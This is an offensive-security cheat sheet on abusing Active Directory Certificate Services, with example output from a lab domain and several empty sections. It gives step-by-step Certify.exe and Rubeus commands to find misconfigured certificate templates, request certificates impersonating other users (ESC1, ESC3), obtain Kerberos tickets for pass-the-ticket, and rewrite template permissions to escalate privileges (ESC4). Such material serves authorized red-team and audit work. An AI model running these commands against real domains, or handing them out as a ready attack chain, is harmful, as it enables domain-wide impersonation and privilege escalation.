# Active Directory Certificate Services


## Table of Contents
```
```
## Tools Required

```
```

## Enumeration

### Broad Vulnerability Checks

#### Certificate Authorities

```bash
.\Certify.exe enum-cas --filter-vulnerable --domain $DOMAIN --ldapserver $DC
```

Enumerate for vulnerabilities that are specific to the Certificate Authority itself.
> Example Output
```
[*] Enterprise/enrollment certificate authorities:

    Enterprise CA Name            : ESSOS-CA
    DNS Hostname                  : braavos.essos.local
    FullName                      : braavos.essos.local\ESSOS-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local
    Cert Thumbprint               : D093244B4F9652B57AF050E1E5D8A8A2F2F1F2CD
    Cert Serial                   : 76BF7C787B6AADAB4245AC9985588571
    Cert Start Date               : 9/9/2025 9:39:41 PM
    Cert End Date                 : 9/9/2030 9:49:41 PM
    Cert Chain                    : CN=ESSOS-CA,DC=essos,DC=local
    User Specifies SAN            : Enabled
    RPC Request Encryption        : Disabled
    Vulnerabilities
      ESC6                        : The CA allows enrollees to specify SANs.
      ESC8                        : The CA supports HTTP web enrollment without channel binding.
      ESC11                       : The CA does not enforce encryption on the ICertPassage RPC interface.
```

#### Templates

Search for vulnerable templates. It is also worth removing the ```--filter-enabled``` parameter to identify vulnerble disabled templates which are still a finding, if they were to ever be enabled again in the future.

```bash
.\Certify.exe enum-templates --ca $PublishingCA --ldapserver $DC --filter-vulnerable --filter-enabled --hide-admins
```



## ESC1

### Requirements
- ```ENROLLEE_SUPPLIES_SUBJECT``` flag in the certificate template
- Enrollment rights granted to a user or group for which we have access to
- Manager approval not enabled
- Authorized signature are not required

### Enumeration
```bash
.\Certify.exe enum-templates --ca $PublishingCA --ldapserver $DC --filter-vulnerable --filter-enabled --hide-admins --filter-supply-subject
```

### Exploit
> Request Certificate
```bash
.\Certify.exe request --ca $PublishingCA --template $TEMPLATE --upn $USER --sid $SID
```
> Ask TGT
```bash
.\Rubeus.exe Rubeus.exe asktgt /certificate:MIACAQMwgAYJKo... /domain:$DOMAIN /user:$USER /dc:$DCIP /nowrap /ptt /enctype:aes256 /opsec
```

## ESC2

### Requirements

if ```ENROLLEE_SUPPLIES_SUBJECT``` is present:

- ```ENROLLEE_SUPPLIES_SUBJECT``` flag present in the certificate template
- Enrolment rights granted to a user or group for which we have access to
- EKU is set to "Any Purpose" or nothing at all
- Manager approval not enabled
- Authorized signature are not required

if ```ENROLLEE_SUPPLIES_SUBJECT``` is **NOT** present:

- Enrolment rights granted to a user or group for which we have access to
- EKU is set to "Any Purpose" or nothing at all
- Manager approval not enabled
- Authorized signature are not required

Then the template can be used as a certificate request agent in which this attack becomes ESC3. If this is the case, follow the guidance below to abuse ESC3

### Enumeration
```bash
.\Certify.exe enum-templates --ca $PublishingCA --ldapserver $DC --filter-vulnerable --filter-enabled --hide-admins
```
```diff
Template Name                              : ESC2
     Enabled                               : True
     Publishing CAs                        : braavos.essos.local\ESSOS-CA
     Schema Version                        : 2
     Validity Period                       : 1 year
     Renewal Period                        : 6 weeks
     Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN
     Enrollment Flag                       : AUTO_ENROLLMENT
+    Manager Approval Required             : False
+    Authorized Signatures Required        : 0
+    Extended Key Usage                    : Any Purpose
     Certificate Application Policies      : Any Purpose
     Vulnerabilities
+      ESC2                                : The template has the 'Any Purpose' EKU.
     Permissions
       Enrollment Permissions
+        Enrollment Rights           : ESSOS\Domain Users                 S-1-5-21-365136873-3771736488-3147536774-513
         All Extended Rights         : NT AUTHORITY\SYSTEM                S-1-5-18
       Object Control Permissions
         Full Control                : NT AUTHORITY\SYSTEM                S-1-5-18
         Write Owner                 : NT AUTHORITY\SYSTEM                S-1-5-18
         Write Dacl                  : NT AUTHORITY\SYSTEM                S-1-5-18
         Write Property              : NT AUTHORITY\SYSTEM                S-1-5-18
```

### Exploit (ENROLLEE_SUPPLIES_SUBJECT)




### Exploit (Leading to ESC3)


## ESC3

- ```Request Certificate for Enrollment Agent -> Enrollement Agent Requests Certificate on behalf of another user``` 




### Requirements (Enrollment Agent Certificate)

- Either the certificate EKU is set for "Certificate Request Agent". Or the certificate EKU is set for "Any Purpose"
- Enrolment rights granted to a user or group for which we have access to
- Manager approval not enabled
- Authorized signatures are not required

### Requirements (On-Behalf-Of Certificate)
Providing the above conditions are met for the certificate template with "Certificate Request Agent" EKU set. The following, second condition set needs to be met on a second template.

- The template defines an EKU which can be used for authentication for example "Client Authentication"
- No restrictions on enrollment agents are implemented at the CA level.
- The template schema version is `1` **OR** 
- The template schema version is `2` **AND** `Required Application Policies` is set to `Certificate Request Agent` 
- Enrolment rights granted to a user or group for which we have access to
- Manager approval not enabled

### Enumeration (Enrollment Agent Certificate)

```bash
.\Certify.exe enum-templates --ca $PublishingCA --ldapserver $DC --filter-vulnerable --filter-enabled --hide-admins
```
```diff
     Template Name                         : ESC3-CRA
     Enabled                               : True
     Publishing CAs                        : braavos.essos.local\ESSOS-CA
     Schema Version                        : 2
     Validity Period                       : 1 year
     Renewal Period                        : 6 weeks
     Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN
     Enrollment Flag                       : AUTO_ENROLLMENT
+    Manager Approval Required             : False
+    Authorized Signatures Required        : 0
+    Extended Key Usage                    : Certificate Request Agent
     Certificate Application Policies      : Certificate Request Agent
     Vulnerabilities
+      ESC3                                : The template has the 'Certificate Request Agent' EKU.
     Permissions
       Enrollment Permissions
+        Enrollment Rights           : ESSOS\Domain Users                 S-1-5-21-365136873-3771736488-3147536774-513
         All Extended Rights         : NT AUTHORITY\SYSTEM                S-1-5-18
       Object Control Permissions
         Full Control                : NT AUTHORITY\SYSTEM                S-1-5-18
         Write Owner                 : NT AUTHORITY\SYSTEM                S-1-5-18
         Write Dacl                  : NT AUTHORITY\SYSTEM                S-1-5-18
         Write Property              : NT AUTHORITY\SYSTEM                S-1-5-18
```

### Enumeration (On-Behalf-Of Certificate)

⚡ A likely candidate for the 2nd condition template is the default "User" template.

```bash
.\Certify.exe enum-templates --ca $PublishingCA --ldapserver $DC --filter-clientauth --filter-enabled --hide-admins
```
```diff
     Template Name                         : User
     Enabled                               : True
     Publishing CAs                        : braavos.essos.local\ESSOS-CA
+    Schema Version                        : 1
     Validity Period                       : 1 year
     Renewal Period                        : 6 weeks
     Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL,  SUBJECT_REQUIRE_DIRECTORY_PATH
     Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Manager Approval Required             : False
+    Authorized Signatures Required        : 0
+    Extended Key Usage                    : Client Authentication, <--Snip-->
     Certificate Application Policies      : <null>
     Permissions
       Enrollment Permissions
+        Enrollment Rights           : ESSOS\Domain Users                 S-1-5-21-365136873-3771736488-3147536774-513
       Object Control Permissions
```

### Exploit 
#### Request Enrollment Agent Certificate
```bash
.\Certify.exe request --ca $PublishingCA --template $TEMPLATE_1
```


#### Request 'On-Behalf-Of' Certificate using Enrollment Agent Certificate
```bash
.\Certify.exe request-agent --ca $PublishingCA --template $TEMPLATE_2 --target $USER --agent-pfx "MIACAQMwg..."
```

> Ask TGT
```bash
.\Rubeus.exe Rubeus.exe asktgt /certificate:MIACAQMwgAYJKo... /domain:$DOMAIN /user:$USER /dc:$DCIP /nowrap /ptt /enctype:aes256 /opsec
```

## ESC4

### Full Control / Write Property

Full Control or Write Property roights over a certificate template lets you modify the certificate in just about anyway. The simplest vector would be to reconfigure the template to be vulnerable to ESC1.

| Configuration | Description | Certify Command |
|---------------|-------------|-----------------|
| Enrollment Rights | Grant enrollment permissions to principal | ```Certify.exe manage-template --template $TEMPLATE --enroll $SID``` |
| Manager Approval | Disable manager approval | `Certify.exe manage-template --template $TEMPLATE --manager-approval` |
| Authorized Signatures | Disable authorized signatures  | `Certify.exe manage-template --template $TEMPLATE --authorized-signatures 0` |
| Client Authentication | Enable client support | `Certify.exe manage-template --template $TEMPLATE --client-auth --pkinit-auth --smartcard-logon` |
| Subject Details | Allow enrollees to provide alternate SAN | `Certify.exe manage-template --template $TEMPLATE --supply-subject` |

### Owner / Write DACL / Write Owner

**Privilege Escalation Chain:**

If we have any of the rights above, these can be chained together to escalate to "Full Control / Write Property" rights:

- **Owner / Write DACL** → **Full Control / Write Property**

```OR```
- **Write Owner** → **Owner / Write DACL** → **Full Control / Write Property**

#### Method 1: Owner / Write DACL → Full Control / Write Property

```bash
.\Certify.exe manage-template --template $TEMPLATE --write-property $UserSID
```

#### Method 2: Write Owner → Owner / Write DACL → Full Control / Write Property

```bash
# Step 1: Grant Owner Rights
.\Certify.exe manage-template --template $TEMPLATE --owner $UserSID

# Step 2: Grant Write-Property Rights
.\Certify.exe manage-template --template $TEMPLATE --write-property $UserSID
```

## ESC6

